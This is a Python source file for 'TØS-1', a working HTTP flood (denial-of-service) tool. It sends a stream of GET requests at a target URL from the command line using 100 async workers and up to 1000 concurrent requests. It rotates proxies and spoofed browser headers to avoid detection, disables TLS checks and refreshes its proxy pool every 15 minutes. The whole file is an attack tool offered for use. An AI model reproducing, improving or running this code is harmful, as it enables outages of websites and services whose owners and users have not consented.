import aiohttp
import asyncio
import random
import time
import os
import sys
from datetime import datetime

class TOS1_S023:
    def __init__(self, target_url):
        self.target_url = target_url
        self.session_id = "S023"
        self.total_requests = 0
        self.start_time = time.time()
        
        # Proxy system
        self.proxy_files = ['h1.txt', 'h2.txt']
        self.proxies = []
        self.current_proxy_index = 0
        self.proxy_rotation_count = 0
        
        # Header system
        self.ua_file = 'ua.txt'
        self.user_agents = []
        self.headers_list = []
        
        # Attack control
        self.attacking = True
        self.connector = None
        self.semaphore = asyncio.Semaphore(1000)  # Max concurrent requests
        
        # Maintenance
        self.last_maintenance = time.time()
        self.maintenance_interval = 900  # 15 minutes
        self.maintenance_active = False
        
        # Performance tracking
        self.requests_per_second = 0
        self.last_rps_calc = time.time()
        self.requests_since_last_calc = 0
        
    def clear_terminal(self):
        os.system('cls' if os.name == 'nt' else 'clear')
    
    def load_proxies(self):
        """Load and test proxies from files"""
        self.proxies = []
        for file in self.proxy_files:
            if os.path.exists(file):
                with open(file, 'r') as f:
                    lines = f.readlines()
                    for line in lines:
                        proxy = line.strip()
                        if proxy and ':' in proxy:
                            self.proxies.append(f'http://{proxy}')
        
        print(f"[+] Loaded {len(self.proxies)} proxies")
        return len(self.proxies) > 0
    
    def load_user_agents(self):
        """Load user agents from file"""
        if os.path.exists(self.ua_file):
            with open(self.ua_file, 'r') as f:
                self.user_agents = [line.strip() for line in f if line.strip()]
        
        # Generate realistic headers
        self.generate_headers()
        
        return len(self.user_agents) > 0
    
    def generate_headers(self):
        """Generate realistic headers for rotation"""
        accept_languages = [
            'en-US,en;q=0.9',
            'en-GB,en;q=0.8',
            'de-DE,de;q=0.9',
            'fr-FR,fr;q=0.8',
            'es-ES,es;q=0.9'
        ]
        
        accept_encodings = ['gzip, deflate, br', 'gzip, deflate']
        
        self.headers_list = []
        for ua in self.user_agents[:50]:  # Use first 50 for variety
            headers = {
                'User-Agent': ua,
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'Accept-Language': random.choice(accept_languages),
                'Accept-Encoding': random.choice(accept_encodings),
                'Connection': 'keep-alive',
                'Upgrade-Insecure-Requests': '1',
                'Sec-Fetch-Dest': 'document',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': 'none',
                'Cache-Control': 'no-cache',
                'Pragma': 'no-cache'
            }
            self.headers_list.append(headers)
    
    def get_random_headers(self):
        """Get random realistic headers"""
        if self.headers_list:
            return random.choice(self.headers_list)
        return {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': '*/*'
        }
    
    def get_next_proxy(self):
        """Get next proxy in rotation"""
        if not self.proxies:
            return None
        
        self.current_proxy_index = (self.current_proxy_index + 1) % len(self.proxies)
        self.proxy_rotation_count += 1
        
        return self.proxies[self.current_proxy_index]
    
    async def make_request(self, session):
        """Make a single request with random proxy and headers"""
        try:
            proxy = self.get_next_proxy()
            headers = self.get_random_headers()
            
            async with self.semaphore:
                async with session.get(
                    self.target_url,
                    headers=headers,
                    proxy=proxy,
                    timeout=aiohttp.ClientTimeout(total=10),
                    ssl=False
                ) as response:
                    await response.read()
                    return True
                    
        except Exception as e:
            return False
        finally:
            self.total_requests += 1
            self.requests_since_last_calc += 1
    
    async def attack_worker(self, session, worker_id):
        """Worker that sends requests continuously"""
        while self.attacking and not self.maintenance_active:
            await self.make_request(session)
            
            # Calculate RPS every second
            current_time = time.time()
            if current_time - self.last_rps_calc >= 1.0:
                self.requests_per_second = self.requests_since_last_calc
                self.requests_since_last_calc = 0
                self.last_rps_calc = current_time
    
    async def maintenance_cycle(self):
        """Maintenance every 15 minutes"""
        while True:
            await asyncio.sleep(1)
            
            current_time = time.time()
            if (current_time - self.last_maintenance >= self.maintenance_interval and 
                not self.maintenance_active and self.attacking):
                
                print(f"\n[!] TØS Maintenance Started")
                self.maintenance_active = True
                
                # Pause attacks
                await asyncio.sleep(2)
                
                # Refresh proxies
                self.load_proxies()
                self.load_user_agents()
                self.generate_headers()
                
                # Clear any session data
                if self.connector:
                    await self.connector.close()
                
                print(f"[+] Maintenance Complete - Refreshed {len(self.proxies)} proxies")
                
                self.maintenance_active = False
                self.last_maintenance = current_time
    
    async def proxy_warmup(self):
        """30-second warmup to find working proxies"""
        print("𝖳Ø𝖲-1 | 𝖲023")
        await asyncio.sleep(2)
        self.clear_terminal()
        
        print("[+] 30s Warmup - Testing proxies...")
        warmup_end = time.time() + 30
        
        working_proxies = []
        
        while time.time() < warmup_end:
            if self.proxies:
                proxy = random.choice(self.proxies)
                try:
                    connector = aiohttp.TCPConnector(ssl=False)
                    timeout = aiohttp.ClientTimeout(total=5)
                    
                    async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
                        async with session.get(
                            'http://httpbin.org/ip',
                            proxy=proxy,
                            timeout=aiohttp.ClientTimeout(total=5)
                        ) as response:
                            if response.status == 200:
                                working_proxies.append(proxy)
                    
                    await connector.close()
                except:
                    pass
            
            await asyncio.sleep(0.1)
        
        # Update proxies with working ones
        if working_proxies:
            self.proxies = working_proxies
            print(f"[+] Found {len(self.proxies)} working proxies")
        else:
            print("[-] No working proxies found, using direct connection")
            self.proxies = []
        
        await asyncio.sleep(1)
        self.clear_terminal()
    
    async def display_stats(self):
        """Display stats with overwriting"""
        while self.attacking:
            current_time = time.time()
            elapsed = current_time - self.start_time
            minutes = int(elapsed // 60)
            seconds = int(elapsed % 60)
            
            # Calculate maintenance time
            maintenance_time = max(0, self.maintenance_interval - (current_time - self.last_maintenance))
            maint_min = int(maintenance_time // 60)
            maint_sec = int(maintenance_time % 60)
            
            # Overwriting display
            sys.stdout.write(f'\rTØS-TRS — {self.total_requests:,} | {{S023, TØS-RR}} | RPS: {self.requests_per_second:,} | Next Maint: {maint_min:02d}:{maint_sec:02d}')
            sys.stdout.flush()
            
            await asyncio.sleep(0.001)  # Every millisecond
    
    async def run(self):
        """Main attack function"""
        # Initial display
        print("𝖳Ø𝖲-1 | 𝖲023")
        await asyncio.sleep(2)
        self.clear_terminal()
        
        # Load resources
        if not self.load_proxies():
            print("[-] No proxy files found")
            return
        
        if not self.load_user_agents():
            print("[-] No user agents found")
            return
        
        # 30-second proxy warmup
        await self.proxy_warmup()
        
        print(f"[+] Target: {self.target_url}")
        print(f"[+] Proxies: {len(self.proxies)}")
        print(f"[+] Headers pool: {len(self.headers_list)}")
        print("[+] Starting attack...\n")
        
        # Create session with high concurrency
        self.connector = aiohttp.TCPConnector(
            limit=0,  # No limit
            limit_per_host=0,
            ttl_dns_cache=300,
            use_dns_cache=True,
            ssl=False
        )
        
        async with aiohttp.ClientSession(
            connector=self.connector,
            timeout=aiohttp.ClientTimeout(total=30)
        ) as session:
            
            # Start all tasks
            tasks = []
            
            # Start maintenance cycle
            tasks.append(asyncio.create_task(self.maintenance_cycle()))
            
            # Start stats display
            tasks.append(asyncio.create_task(self.display_stats()))
            
            # Start attack workers (100 workers for high RPS)
            for i in range(100):
                tasks.append(asyncio.create_task(self.attack_worker(session, i)))
            
            # Run forever
            try:
                await asyncio.gather(*tasks)
            except KeyboardInterrupt:
                self.attacking = False
                print("\n\n[!] Attack stopped by user")
            finally:
                # Cleanup
                await self.connector.close()

def main():
    if len(sys.argv) != 2:
        print("Usage: python tos1.py https://target.com")
        return
    
    target_url = sys.argv[1]
    
    # Set high process priority (Unix/Mac)
    if os.name != 'nt':
        try:
            os.nice(-20)  # Maximum priority
        except:
            pass
    
    tos = TOS1_S023(target_url)
    
    # Set event loop policy for better performance
    if sys.platform == 'win32':
        asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
    
    try:
        asyncio.run(tos.run())
    except KeyboardInterrupt:
        print("\n\n=== TØS-1 FINAL STATS ===")
        print(f"Total Requests: {tos.total_requests:,}")
        runtime = time.time() - tos.start_time
        print(f"Runtime: {int(runtime // 60):02d}:{int(runtime % 60):02d}")
        print(f"Average RPS: {tos.total_requests / runtime if runtime > 0 else 0:.1f}")
        print("=" * 40)

if __name__ == "__main__":
    main()
